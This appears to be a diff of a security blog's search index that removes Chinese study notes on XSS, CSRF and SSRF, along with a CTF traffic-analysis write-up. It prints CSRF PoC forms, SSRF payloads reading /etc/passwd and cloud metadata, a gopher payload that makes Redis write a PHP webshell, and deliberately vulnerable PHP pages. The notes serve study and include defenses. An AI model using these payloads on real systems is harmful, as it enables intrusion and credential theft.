---seeds从文件中测试、抓取 URL
---fuzzer测试过滤器和 Web 应用程序防火墙（WAF）
---update更新工具
---timeout设置超时时间
---params指定参数
---crawl爬行目标网站
---proxy使用代理
---blind盲测试
---skip跳过确认提示
---skip-dom跳过 DOM 扫描
---headers提供 HTTP 标头
--d, --delay设置请求延迟
-
-3.2 使用示例# 安装依赖pip install -r requirements.txt -i https://mirrors.aliyun.com/pypi/simple/# Fuzz测试python xsstrike.py -u &quot;http://localhost/1.php?x=1&quot; --fuzzer# 直接探测python xsstrike.py -u &quot;http://localhost/1.php?x=1&quot;
-
-3.3 优化测试页面&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;&lt;title&gt;欢迎来到&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;欢迎&lt;/h1&gt;&lt;?php$xss = $_GET[&#x27;x&#x27;];echo $xss;?&gt;&lt;center&gt;测试XSS&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;
-
-五、总结Q1：XSS 是什么？跨站脚本攻击
-Q2：XSS的产生原因是什么？后端开发没有对用户传入的参数做严格的限制或过滤，直接输出了用户传入的参数，导致用户传入的参数被浏览器当作 javascript 执行。
-Q3：XSS有什么危害？1、获取浏览器的其他信息
-2、窃取浏览器的敏感信息
-3、劫持浏览器（用  BeEF ，了解常用功能，比如：重定向redirect、）
-Q4：怎么修复 XSS漏洞？过滤常见关键字
-Q5：怎么绕 WAF？挨个使用 audio、script、video、button标签、加密算法，最后使用产生随机码。
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>XSS</category>
-      </categories>
-      <tags>
-        <tag>XSS</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CSRF与SSRF漏洞</title>
-    <url>/2026/06/08/CSRF-SSRF/index/</url>
-    <content><![CDATA[一、CSRF（跨站请求伪造）1. 简介与危害
-全称：Cross-site request forgery，跨站请求伪造，也叫one-click attack
-原理：攻击者伪造请求，欺骗已登录用户点击，利用浏览器自动携带Cookie的特性，以用户身份执行未授权操作
-危害：可实现转账、修改密码、修改个人信息、新增管理员等敏感操作
-
-2. 工作原理
-用户登录目标网站，浏览器存储认证Cookie（含sessionid）
-服务器仅通过Cookie验证用户身份
-攻击者诱导用户访问恶意页面&#x2F;链接，浏览器自动携带Cookie发送请求
-服务器误认为是用户本人操作，执行恶意请求
-
-
-
-3. 攻击前提条件
-存在CSRF漏洞
-用户已登录目标网站
-攻击者了解请求协议包
-浏览器支持Cookie自动携带
-用户点击恶意链接&#x2F;页面
-
-4. Pikachu靶场实战4.1 CSRF(GET)攻击步骤
-登录账号：kobe&#x2F;123456
-
-
-
-
-
-
-抓包获取修改信息的请求URL
-
-
-
-
-
-
-GET &#x2F;pikachu&#x2F;vul&#x2F;csrf&#x2F;csrfget&#x2F;csrf_get_edit.php?sex&#x3D;kobe&amp;phonenum&#x3D;1&amp;add&#x3D;1&amp;email&#x3D;1%40pikachu.com&amp;submit&#x3D;submit HTTP&#x2F;1.1
-
-
-构造恶意HTML页面（script&#x2F;img&#x2F;form标签）
-
-&lt;script src=&quot;http://127.0.0.1/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=4&amp;phonenum=4&amp;add=4&amp;email=4@pikachu.com&amp;submit=submit&quot;&gt;&lt;/script&gt;hello
-
-
-上传至恶意服务器，诱导用户访问
-
-
-
-
-用户访问后，信息被悄无声息篡改
-
-
-
-4.2 CSRF(POST)攻击
-
-
-利用Burp Suite生成CSRF PoC表单页面
-
-
-
-
-
-构造恶意HTML页面，修改电话号码为 999999 放到恶意服务器上
-&lt;html&gt;  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;  &lt;body&gt;    &lt;form action=&quot;http://127.0.0.1/pikachu/vul/csrf/csrfpost/csrf_post_edit.php&quot; method=&quot;POST&quot;&gt;      &lt;input type=&quot;hidden&quot; name=&quot;sex&quot; value=&quot;aaa&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;phonenum&quot; value=&quot;999999&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;add&quot; value=&quot;111&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;1&amp;#64;pikachu&amp;#46;com&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;    &lt;/form&gt;    &lt;script&gt;      history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;);      document.forms[0].submit();    &lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;
-
-
-诱导已登录用户访问，自动提交POST请求完成攻击
-
-
-
-
-
-5. 自动化工具
-Burp Suite：拦截请求→Action→Generate CSRF PoC→生成HTML攻击页面
-OWASP CSRFTester：代理端口默认8008，拦截请求→修改参数→生成HTML（GET选IMG，POST选Forms）
-
-
-设置好代理（和 bp 一样的）
-
-
-
-
-
-
-
-
-
-6. 防御方法6.1 用户层面
-不点击恶意链接、不访问可疑网站
-关键网站使用后及时退出登录
-关键操作进行二次验证（短信、邮件、人脸识别）
-
-6.2 开发层面同源策略：让关键操作只来自自身域名的请求，不接受跨域请求
-
-CSRF Token：服务端会话生成随机Token，请求携带并验证
-验证来源：服务端检查Referer&#x2F;Origin头，确保请求来自可信域
-双重提交Cookie：客户端与服务器同时校验Token
-请求方法限制：敏感操作服务端只接受 POST&#x2F;PUT&#x2F;DELETE，禁用GET
-SameSite Cookie：设置为Strict&#x2F;Lax，限制跨站Cookie发送
-
-
-补充：
-1、 SameSite Cookie 是什么
-SameSite 是 Cookie 的一个属性，用来告诉浏览器：跨站请求时，要不要把 Cookie 带过去。它有三个值：Strict、Lax、None，其中前两个是 CSRF 防御的核心。
-2、SameSite=Strict
-
-规则：任何跨站请求，都不携带 Cookie
-不管是点击链接、提交表单，还是 &lt;img&gt;&#x2F;&lt;script&gt; 跨站请求，只要不是在当前域名的页面里发起的，Cookie 都不会带过去。
-
-
-效果：CSRF 攻击完全没法用，因为浏览器根本不会把用户的认证 Cookie 传给目标网站。
-缺点：用户体验差。比如你从别的网站点链接跳过来，Cookie 不携带，会直接变成“未登录状态”。
-
-3、SameSite=Lax（浏览器默认值）
-
-规则：只允许“安全的导航型GET请求”携带Cookie
-✅ 允许：用户主动点击跨站链接、地址栏输入地址这种导航式GET请求，会带Cookie。
-❌ 禁止：跨站的POST表单提交、&lt;img&gt;&#x2F;&lt;script&gt;&#x2F;&lt;iframe&gt; 自动发起的请求，不会带Cookie。
-
-
-效果：既防住了绝大多数 CSRF 攻击（因为CSRF常用POST或自动GET请求），又不影响用户正常跳转体验。
-适用场景：绝大多数网站的默认配置，平衡安全和体验。
-
-
-
-二、SSRF（服务器请求伪造）1. 简介与危害
-全称：Server-Side Request Forgery，服务器请求伪造
-原理：攻击者构造请求，由服务端发起请求，访问内网&#x2F;本地资源
-核心特点：服务端可访问外网无法触及的内网系统
-
-2. 业务场景
-远程图片加载、URL采集、在线翻译、文件读取等
-服务端未校验用户传入的URL，导致恶意请求被执行
-
-3. 攻击利用方式常用四类协议：http/https、file、dict、gopher，权限与攻击能力逐级增强。
-
-内网文件读取：file://
-内网网页扫描&#x2F;云元数据：http://
-简单端口探测、单行数据库命令：dict://
-SSRF最高权限、内网RCE、完整协议攻击：gopher://
-
-3.1 HTTP &#x2F; HTTPS（最基础，通用探测）3.1.1 作用对内网存活扫描、端口探测、内网Web服务访问、读取内网接口数据、绕过前端访问内网后台。
-3.1.2 利用方式
-内网端口扫描
-
-http://127.0.0.1:3306http://192.168.1.1:8080
-
-通过页面超时&#x2F;报错差异判断端口开放。
-
-访问内网管理后台
-
-http://127.0.0.1/adminhttp://169.254.169.254/latest/meta-data  # AWS云服务器元数据泄露
-
-
-内网HTTP接口攻击
-
-对内网未授权接口发起GET&#x2F;POST请求，增删改数据。
-内网 HTTP 接口一般是：内网后台、管理系统、API、微服务、监控面板、容器管理、运维工具（Jenkins、Nacos、Consul、K8s ApiServer）。  
-常见攻击场景：
-场景 1：读取内网后台敏感数据
-内网存在管理后台 http://127.0.0.1:8080/user/list，未做鉴权，直接返回全部用户账号密码。 SSRF Payload：
-http://漏洞网站/ssrf.php?url=http://127.0.0.1:8080/user/list
-
-漏洞服务器会访问这个内网接口，把用户列表返回到页面。
-场景 2：调用内网高危修改接口（越权操作）
-内网接口 http://192.168.0.10:9000/admin/del_user?id=1 可删除管理员账号。 我们无法在外网直接访问，但 SSRF 可以代为发送 GET 请求，删除账号。
-场景 3：内网微服务 API 漏洞利用
-企业内网微服务之间无认证，接口支持新增管理员、上传文件、执行命令：
-
-Nacos：未授权接口可新增账号、配置泄露；
-Jenkins：内网接口可构建任务执行命令；
-K8s ApiServer：内网未授权可接管全部容器；
-SpringBoot Actuator：&#x2F;env、&#x2F;shutdown、&#x2F;heapdump 泄露配置、关闭服务。
-
-Payload 示例（读取 SpringBoot 配置）：
-http://xxx/ssrf?url=http://127.0.0.1:8090/actuator/env
-
-
-
-场景 4：云服务器内网元数据接口（SSRF 内网 HTTP 攻击）
-阿里云 &#x2F; AWS 内网存在特殊 HTTP 接口 169.254.169.254，外网无法访问，内网服务器可直接调取密钥、账号凭证：
-http://xxx/ssrf?url=http://169.254.169.254/latest/meta-data/
-
-拿到云服务器密钥，可直接接管整台云主机。
-场景 5：内网文件上传接口 getshell
-内网有上传接口 http://127.0.0.1:8081/upload，无校验可传 php 木马，通过 SSRF 间接访问上传地址写入 webshell。
-3.1.3 局限只能发送标准HTTP请求，无法自定义TCP原始报文；不能操作非Web协议（Redis&#x2F;Mysql&#x2F;FTP）。
-3.2 file 协议（读取本地文件，文件读取漏洞）3.2.1 作用读取服务器本地任意文件，获取配置、密钥、源码、账号密码。
-3.2.2 利用Payloadfile:///etc/passwd        # Linux 用户列表file:///C:/Windows/System32/drivers/etc/hosts  # Windows hostsfile:///www/config.php    # 网站数据库配置文件
-
-3.2.3 限制
-仅读文件，不能写文件；
-部分PHP&#x2F;Java环境会过滤file://协议；
-无法操作网络服务，只针对本地磁盘。
-
-3.3 dict 协议（探测TCP端口、简单命令交互）3.3.1 作用主动向任意TCP端口发送自定义单行数据，探测端口指纹、简单数据库交互。
-3.3.2 语法格式dict://ip:port/自定义数据
-3.3.3 常见利用场景
-Redis 简单命令执行（单行指令）
-
-dict://127.0.0.1:6379/SET test 123dict://127.0.0.1:6379/FLUSHDB
-
-
-Mysql 端口探测、发送探测语句
-
-dict://127.0.0.1:3306/select user();
-
-
-端口指纹识别向端口发送测试字符，根据返回内容判断服务类型（Redis&#x2F;Mongo&#x2F;Mysql）。
-
-3.3.4 短板只能发送单行字符串，不支持多行、复杂交互协议（Redis写shell需要多行报文，dict无法完成）。
-3.4 gopher 协议3.4.1 核心优势支持完整自定义TCP数据流，多行报文、二进制数据，可攻击绝大多数内网TCP服务，SSRF漏洞利用天花板。
-3.4.2 标准格式gopher://ip:port/_URLEncode后的TCP报文下划线 _ 代表TCP报文起始位置，所有换行、特殊字符必须URL编码。
-3.4.3 利用场景（1）Redis 写WebShell（多行指令）原始报文：
-set shell &quot;&lt;?php eval($_GET[cmd]);?&gt;&quot;config set dir /var/www/htmlconfig set dbfilename shell.phpsave
-
-编码后payload：
-gopher://127.0.0.1:6379/_%0D%0Aset%20shell%20%22%3C%3Fphp%20eval(%24_GET%5Bcmd%5D)%3B%3F%3E%22%0D%0Aconfig%20set%20dir%20/var/www/html%0D%0Aconfig%20set%20dbfilename%20shell.php%0D%0Asave%0D%0A
-
-（2）攻击Mysql、PostgreSQL、FTP完整构造登录、查询、建表报文，无需客户端。
-（3）内网FastCGI攻击（PHP-FPM RCE）构造FastCGI协议原始数据包，直接远程代码执行。
-（4）内网Memcache、Zookeeper、Tomcat 未授权访问3.4.4 补充
-换行必须用 %0d%0a（CRLF）；
-部分语言（PHP）gopher默认不支持https，仅TCP；
-可绕过简单端口过滤、内网IP限制。
-
-3.5 对比
-
-
-协议
-核心能力
-适用场景
-缺陷
-
-
-
-http&#x2F;https
-发起HTTP请求，内网Web扫描
-后台探测、云元数据读取
-仅HTTP，无法操作TCP服务
-
-
-file
-读取服务器本地文件
-拿配置、密码、源码
-无网络操作能力
-
-
-dict
-单行TCP数据发送
-端口探测、简单Redis单命令
-不支持多行协议报文
-
-
-gopher
-自定义完整多行TCP原始数据包
-Redis写shell、FastCGI RCE、所有内网TCP服务攻击
-报文需要手动URL编码，构造复杂
-
-
-4. 危害
-内网端口扫描
-内网Web应用指纹识别
-攻击内网应用
-读取服务器本地文件
-
-5. 实战案例5.1 自定义SSRF测试页面页面提供输入框，用户提交url参数，后端用curl在服务端访问传入的地址，输出响应内容。  
-&lt;!DOCTYPEHTMLPUBLIC&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;&gt;&lt;html&gt;&lt;head&gt;   &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;/&gt;   &lt;title&gt;SSRF&lt;/title&gt;&lt;/head&gt;&lt;body&gt;远程图片加载器&lt;form action=&quot;&quot; method=&quot;POST&quot;&gt;    请输入图片地址：&lt;input type=&#x27;text&#x27; name=&#x27;url&#x27;&gt;   &lt;input type=&#x27;submit&#x27; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;?php   if(isset($_POST[&#x27;url&#x27;]))&#123;      $url = $_POST[&#x27;url&#x27;];      $ch=curl_init();      curl_setopt($ch,CURLOPT_URL,$url);      curl_setopt($ch,CURLOPT_HEADER,false);      curl_exec($ch);      curl_close($ch);   &#125;?&gt;
-
-
-
-payload：
-
-HTTP 协议：内网 &#x2F; 本机端口探测
-
-http://127.0.0.1
-
-
-
-
-file 协议：读取服务器本地敏感文件（高危）
-
-file:///C:/Windows/System32/drivers/etc/hosts
-
-
-
-5.2 YzmCMS靶场靶场源码下载：
-.gitee-file{display:flex;align-items:center;gap:14px;padding:16px 18px;margin:16px 0;  border:1px solid #e5e7eb;border-radius:12px;background:#fff;text-decoration:none!important;  transition:box-shadow .25s,transform .25s;color:inherit}.gitee-file:hover{box-shadow:0 6px 24px rgba(0,0,0,.1);transform:translateY(-2px)}.gitee-file .gf-icon{width:44px;height:44px;border-radius:8px;background:#f0f7ff;flex-shrink:0;  display:flex;align-items:center;justify-content:center;color:#5b9bd5}.gitee-file .gf-body{flex:1;min-width:0}.gitee-file .gf-name{font-weight:600;font-size:15px;color:#1f2937;line-height:1.3}.gitee-file .gf-sub{font-size:13px;color:#6b7280;margin-top:3px}.gitee-file .gf-arrow{color:#9ca3af;flex-shrink:0}[data-theme=dark] .gitee-file{background:#1e1e1e;border-color:#333}[data-theme=dark] .gitee-file .gf-name{color:#e5e7eb}[data-theme=dark] .gitee-file .gf-sub{color:#9ca3af}[data-theme=dark] .gitee-file .gf-icon{background:#2a2a2a}
-
-  
-    
-  
-  
-    Yzmcms.zip
-    Gitee 文件 · 点击打开下载
-  
-  
-    
-  
-
-
-如果要重新安装，请删除 cache&#x2F;install.lock！  
-
-
-实操步骤：
-
-搭建靶场
-
-yzmcms\common\config\config.php
-
-
-访问http://127.0.0.1/ssrf/yzmcms/install.php
-
-
-
-
-
-
-
-
-
-进入后台
-
-访问  http://127.0.0.1/ssrf/yzmcms/admin/index/login.html
-账号  yzmcms  
-密码  yzmcms 
-
-
-
-
-
-构造恶意网页，放到网站根目录
-
-
-
-&lt;ssrf&gt;&lt;a href=&quot;file:///C:/Windows/System32/drivers/etc/hosts&quot;&gt;查看hosts文件&lt;/a&gt;&lt;/ssrf&gt;
-
-
-
-
-利用采集功能
-
-
-
-
-
-http://192.168.23.1/yzm/ssrf.html	# 192.168.23.1 是我本机的IP地址
-
-
-
-
-
-流程：
-
-
-6. 漏洞成因服务端提供外部数据获取功能，但未对目标地址做过滤与限制
-7. 防御方法① 禁止访问内网网段IP
-禁止访问的内网网段：回环段 127.0.0.0/8、私网A类 10.0.0.0/8、私网B类 172.16.0.0/12、私网C类 192.168.0.0/16。
-重点：不能只用字符串匹配过滤 127.0.0.1，攻击者可用简写&#x2F;十进制&#x2F;十六进制&#x2F;八进制IP绕过：
-
-
-简写：127.1
-十进制：2130706433
-十六进制：0x7f000001
-八进制：0177.0.0.1
-
-
-正确防护逻辑：先解析URL拿到目标域名，DNS解析出真实IP，再判断IP网段，所有变形IP解析后都会还原标准内网IP，全部拦截。
-
-② 协议白名单限制，仅允许 HTTP&#x2F;HTTPS
-只放行 http://、https:// 两种网页协议；
-直接禁用高危协议，从根源杜绝读取本地文件、攻击内网服务：file://（读服务器本地文件）、ftp://、dict://、gopher://（内网Redis&#x2F;MySQL命令执行）。
-
-③ 统一错误返回信息，消除端口探测差异
-漏洞风险：访问开放端口和关闭端口时，页面报错、响应时长、状态码不同，攻击者可根据差异扫描内网端口。
-防御手段：无论访问成功、失败、超时，全站返回完全一致的通用错误页面，屏蔽响应差异，无法判断端口是否开放。
-
-④ 过滤返回内容，校验响应数据格式
-业务场景：远程图片加载、网页采集功能；
-校验规则：
-
-
-图片功能：仅接收jpg&#x2F;png&#x2F;gif图片二进制，过滤文本、配置源码；
-网页采集：过滤数据库账号、服务器路径、内网地址等敏感内容；
-
-
-效果：即使前面过滤被绕过，服务器也不会把hosts、网站配置等敏感信息回显给攻击者。
-
-⑤ 限制请求端口范围仅开放业务必需的80、443网页端口，拦截3306(MySQL)、6379(Redis)、21(FTP)、22(SSH)等高危内网端口。
-⑥ 关闭URL自动重定向配置curl&#x2F;请求函数禁止跟随跳转，防止攻击者构造跳转域名，跳转至内网IP绕过第一层过滤。
-⑦ 域名二次DNS校验（防御DNS重绑定绕过）攻击者利用DNS短时间切换公网IP&#x2F;内网IP绕过网段检测；防护：域名解析两次，两次解析IP都必须为公网IP才允许请求。
-⑧ 部署独立代理服务转发请求不直接用业务服务器发起网络请求，通过独立隔离的外网代理服务器访问目标地址，业务主机无法直接触达内网资产。
-
-三、CSRF、XSS、SSRF核心区别
-
-
-维度
-XSS
-CSRF
-SSRF
-
-
-
-攻击发起方
-客户端（浏览器执行恶意 JS）
-客户端（用户浏览器）
-服务端（服务器主动发起网络请求）
-
-
-攻击目标
-登录用户、浏览器会话
-外网 Web 网站业务接口
-服务器本地、内网资产
-
-
-利用核心
-恶意脚本注入并执行
-跨域请求自动携带用户 Cookie
-服务端可控 URL 转发请求
-
-
-能力特点
-窃取 Cookie、劫持账号、钓鱼
-冒用用户身份操作，无法拿 Cookie
-读取本地文件、扫描内网、攻击内网服务
-
-
-核心防护方案
-输入转义过滤、CSP、Cookie 设 HttpOnly
-CSRF Token、SameSite、来源 Referer 校验
-协议白名单、内网 IP 拦截、端口限制
-
-
-
-四、总结Q1：CSRF 是什么？跨站请求伪造
-Q2：SSRF 是什么？服务端请求伪造
-Q3：CSRF 和 XSS 的区别是什么？CSRF 是跨站请求伪造，XSS 是跨站脚本攻击
-XSS利用的核心是窃取 cookie，直接使用 cookie 登录受害者账号；CSRF 利用的核心是诱导欺骗，不会获取受害者的信息，而是诱导受害者自己去执行某些恶意操作。
-Q4：CSRF 的危害？盗号：诱导受害者修改自己的密码，修改自己的绑定手机号，发送敏感信息
-改个人信息：诱导受害者修改自己的头像、个性签名、改自己的昵称
-诱导受害者执行命令
-Q5：如何挖 CSRF 漏洞？CSRF 一般无需白盒测试（代码审计），只有黑盒测试。
-Q6：同源策略是什么？浏览器默认的安全配置，不同源的两个网站之间不能互相读写资源，如 cookie 无法读取，XHR（XMLhttprequest，Ajax，axios）无法发送
-Q7：同源网站是什么？两个网站，协议一样，端口一样，域名和 IP 一样，就称为两个网站为同源。
-Q8：jsonp 跨域漏洞是什么？jsonp 跨域漏洞的产生原因是因为没有注意敏感信息，直接用 jsonp 传输了敏感数据。
-Q9：CORS跨域漏洞是什么？CORS 跨域漏洞的产生原因是因为没有注意敏感信息，直接用 CORS 传输了敏感数据。
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>CSRF</category>
-      </categories>
-      <tags>
-        <tag>CSRF</tag>
-        <tag>SSRF</tag>
       </tags>
   </entry>
   <entry>
@@ -6849,444 +7287,6 @@ deny_arr：黑名单
       </categories>
       <tags>
         <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>陇剑杯2021 流量分析题解</title>
-    <url>/2026/08/13/%E9%99%87%E5%89%91%E6%9D%AF2021-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E9%A2%98%E8%A7%A3/index/</url>
-    <content><![CDATA[一、[陇剑杯 2021]jwtQ1：JWT 是什么？JWT（JSON Web Token）：JSON格式的Web令牌，是一种轻量级、无状态的身份认证、授权标准（RFC7519）。用于前后端分离、分布式系统登录鉴权，替代传统 Session。
-1. 核心特点
-无状态：服务端不用存储会话数据，全部信息存在Token里，天然适配集群、微服务
-轻量化：Base64编码字符串，体积小，可放URL、Header、Cookie
-自包含：Token自带用户身份、权限、过期时间等业务信息
-防篡改：通过签名校验，数据无法被随意修改
-
-2. JWT 三段结构（用 . 分割）格式：Header.Payload.Signature
-2.1 Header 头部 —- Base64URL编码作用：声明加密算法、令牌类型示例JSON：
-&#123;  &quot;alg&quot;: &quot;HS256&quot;, // 签名算法：HS256对称加密，RS256非对称  &quot;typ&quot;: &quot;JWT&quot;    // 类型固定JWT&#125;
-
-2.2 Payload 载荷—-Base64URL编码存放业务数据，分标准声明和自定义声明
-
-重要：Payload只是编码，未加密，不能存密码、密钥等敏感数据！
-
-标准内置字段
-
-
-字段
-含义
-
-
-
-iss
-签发者（服务端域名）
-
-
-sub
-用户唯一标识（用户ID）
-
-
-aud
-接收方（客户端）
-
-
-exp
-过期时间戳（必填，超时失效）
-
-
-nbf
-生效时间（在此之前不可用）
-
-
-iat
-签发时间
-
-
-jti
-令牌唯一ID（用于注销、黑名单）
-
-
-自定义字段存放权限、角色、用户名等，例：{&quot;role&quot;:&quot;admin&quot;,&quot;uid&quot;:1001}
-2.3 Signature 签名防止Header+Payload被篡改，生成逻辑：
-
-将 Header、Payload 分别做 Base64URL 编码
-拼接成 base64(header).base64(payload)
-使用 Header 指定算法 + 密钥&#x2F;私钥 加密，得到签名
-
-
-对称加密 HS256：服务端统一一个密钥，签发、校验都用同一密钥
-非对称加密 RS256：私钥签发Token，公钥校验，适合多服务场景
-
-
-签到https://www.nssctf.cn/problem/271
-
-查看协议分级
-
-按字节百分比看，占比最多的是 HTTP
-
-所以 flag：NSSCTF{http}
-
-问 1https://www.nssctf.cn/problem/272
-
-追踪 HTTP 流
-
-base64 解码
-
-eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTAwODYsIk1hcENsYWltcyI6eyJhdWQiOiJhZG1pbiIsInVzZXJuYW1lIjoiYWRtaW4ifX0.dJArtwXjas3_Cg9a3tr8COXF7DRsuX8UjmbC1nKf8fc
-
-认证方式：jwt
-flag：NSSCTF{jwt}
-
-问 2https://www.nssctf.cn/problem/273
-
-base64 解码
-
-eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTAwODYsIk1hcENsYWltcyI6eyJhdWQiOiJhZG1pbiIsInVzZXJuYW1lIjoiYWRtaW4ifX0.dJArtwXjas3_Cg9a3tr8COXF7DRsuX8UjmbC1nKf8fc
-
-
-flag：NSSCTF{10086#admin}
-
-看题，发现说的是绕过验证使用的 jwt，所以要先找到登录成功的一条流量。登录成功之后会执行的常见命令是 whoami
-
-登录失败了。
-如何查找当前所有数据包拥有 whoami 这个命令的数据？
-使用过滤器，输入 http contains &quot;whoami&quot;
-
-逐个追踪 http 流
-
-发现这次登录成功了。
-base64 解码
-
-eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTAwODcsIk1hcENsYWltcyI6eyJ1c2VybmFtZSI6ImFkbWluIn19.rurQD5RYgMrFZow8r-k7KCP13P32sF-RpTXhKsxzvD0
-
-
-flag：NSSCTF{10087#admin}
-
-问 3https://www.nssctf.cn/problem/274
-
-由问 2 知道获得的权限是 root
-flag：NSSCTF{root}
-
-问 4https://www.nssctf.cn/problem/275
-
-上传文件通常不使用 GET 请求，而是使用 POST 或 PUT 请求。
-直接过滤查找 POST 请求的数据包。http.request.method==&quot;POST&quot; 
-
-由前两题，在第 97 条数据包登录成功。所以从 97 条开始看数据包详情
-
-
-在第 107 条数据包中得到信息 cat /tmp/1.c
-说明恶意文件可能是 1.cflag：NSSCTF{1.c}
-
-问 5https://www.nssctf.cn/problem/276
-
-恶意 so 文件，找 后缀为 so 的
-
-flag：NSSCTF{looter.so}
-
-问 6https://www.nssctf.cn/problem/277
-
-找配置文件的绝对路径
-
-flag：NSSCTF{&#x2F;etc&#x2F;pam.d&#x2F;common-auth}
-Q2：PAM 认证后门是什么？1. 定义PAM（Pluggable Authentication Modules，可插拔认证模块） 是Linux系统统一的底层认证框架。系统登录、sudo提权、修改用户密码、SSH登录等所有身份校验操作，底层都会调用PAM模块。
-
-主配置目录：/etc/pam.d/
-全局公共认证配置：/etc/pam.d/common-auth，所有系统服务共用这套认证规则。
-工作机制：通过加载.so动态链接库文件，执行认证校验逻辑。
-
-2. PAM认证后门核心原理攻击者利用PAM加载自定义动态库的特性制作持久后门：
-
-编写恶意C代码，编译生成恶意动态链接库（示例：looter.so）；
-修改全局认证配置 /etc/pam.d/common-auth，添加加载恶意.so模块的配置；
-恶意模块实现两大攻击能力：
-万能密码绕过：输入攻击者预设的特殊密码，直接放行认证，无视用户真实密码；
-窃取明文密码：合法用户正常登录、sudo时，悄悄捕获并落地用户输入的明文账号密码。
-
-
-
-3. 后门特点PAM属于系统底层认证机制，隐蔽性极强：
-
-普通改密码、重启服务无法清除后门；
-就算原始入侵漏洞被修复、管理员重置所有用户密码，攻击者依旧能靠万能密码重新登录；
-常规进程、日志排查很难定位PAM恶意模块。
-
-
-二、[陇剑杯 2021]webshell问 1https://www.nssctf.cn/problem/278
-
-过滤器查找http contains &quot;password&quot;
-
-查看数据详情
-
-flag：NSSCTF{Admin123!@#}
-
-问 2https://www.nssctf.cn/problem/279
-
-修改日志文件
-可以通过过滤器查找 http.request.method==&quot;POST&quot; and http contains &quot;log&quot; 
-
-并且修改文件需要权限，我们可以从上一题登录成功后的数据包开始查找。
-
-但是 data&#x2F;Runtime&#x2F;Logs&#x2F;Home&#x2F;21_08_07.log 并不是绝对路径
-直到第 332 条数据包，我们可以发现黑客在往 1.php 中写入东西
-
-flag：NSSCTF{&#x2F;var&#x2F;www&#x2F;html&#x2F;data&#x2F;Runtime&#x2F;Logs&#x2F;Home&#x2F;21_08_07.log}
-
-问 3https://www.nssctf.cn/problem/280
-
-查看权限
-过滤器 http contains &quot;whoami&quot;
-
-
-在 Linux 系统中，Apache&#x2F;Nginx 等 Web 服务通常以低权限用户 www-data 运行。黑客获取的权限是：www-data
-flag：NSSCTF{www-data}
-
-问 4https://www.nssctf.cn/problem/281
-
-从问 2 知道写入的文件是 1.php
-flag：NSSCTF{1.php}
-
-问 5https://www.nssctf.cn/problem/282
-
-过滤器查找 http.request.uri contains &quot;1.php&quot;
-
-flag：NSSCTF{frpc}
-Q1：frp 是什么？frp &#x3D; Fast Reverse Proxy
-快速反向代理，一款开源内网穿透工具
-1. 组成
-
-frps → frp server 服务端部署在有公网IP的云服务器上
-frpc → frp client 客户端部署在内网设备（家里电脑、校园网主机）
-
-2. 核心用途（内网穿透）
-实现外网访问局域网内设备，常见场景：
-
-外网远程SSH连接家里Linux主机
-在外远程桌面控制Windows电脑
-将本地Web项目暴露公网，给他人测试
-外网访问NAS网盘、智能家居服务
-
-3. 简单工作流程
-
-内网机器启动 frpc，主动出站连接云服务器 frps，维持长连接隧道
-外网用户访问「云服务器IP:远端端口」
-frps收到请求，通过隧道转发给frpc
-frpc把流量交给内网本地程序
-返回数据原路送回外网访问者
-
-4. 支持协议
-TCP、UDP、HTTP、HTTPS、STCP（安全隧道，访客验证）、XTCP（点对点P2P穿透）
-5. 基础文件说明
-
-frps.ini：服务端配置
-frpc.ini：客户端配置
-
-配置示例：
-(注：frp 在较新的版本中官方推荐使用 .toml 格式)
-
-frps.ini：服务端配置 (部署在公网服务器)
-
-这份配置告诉公网服务器，应该在哪些端口监听客户端的连接，以及开放哪些端口给外部用户访问。
-[common]# 核心通信端口：frp 服务端监听的端口，等待你本地的 frpc 来连接bind_port = 7000# 身份验证：设置一个 token 防止别人随意连接你的服务端token = my_secure_password_123# Web 穿透专用：如果需要穿透 HTTP 服务，必须配置这个公网访问端口vhost_http_port = 8080
-
-
-
-frpc.ini：客户端配置
-
-这份配置告诉本地程序，去哪里寻找服务端，以及要把本地的哪些服务（如 Web 测试环境、SSH 终端）映射到公网出去。
-[common]# 指向服务端的公网 IP 地址server_addr = 1.2.3.4# 必须与服务端 bind_port 保持一致server_port = 7000# 必须与服务端 token 保持一致token = my_secure_password_123# --- 示例 1：穿透本地的 Web 测试环境 ---# （比如你本地用 phpStudy 或 Ubuntu 的 Vulhub 搭建了一个漏洞靶场，运行在 80 端口）[web_test_env]type = httplocal_ip = 127.0.0.1local_port = 80# 外部访问的域名。配置好后，访问 http://test.yourdomain.com:8080 就能看到本地 80 端口的内容custom_domains = test.yourdomain.com# --- 示例 2：穿透 SSH 端口进行远程管理 ---[ssh_access]type = tcplocal_ip = 127.0.0.1local_port = 22# 将公网服务器的 6000 端口，映射到本地的 22 端口# 配置好后，在外部通过 ssh -p 6000 user@1.2.3.4 即可连接到这台本地机器remote_port = 6000
-
-当启动这两个服务后：
-
-本地的 frpc 会带着 token，去敲公网 IP 1.2.3.4 的 7000 端口的门。
-frps 验证通过后，两者建立起一条隐秘的隧道。
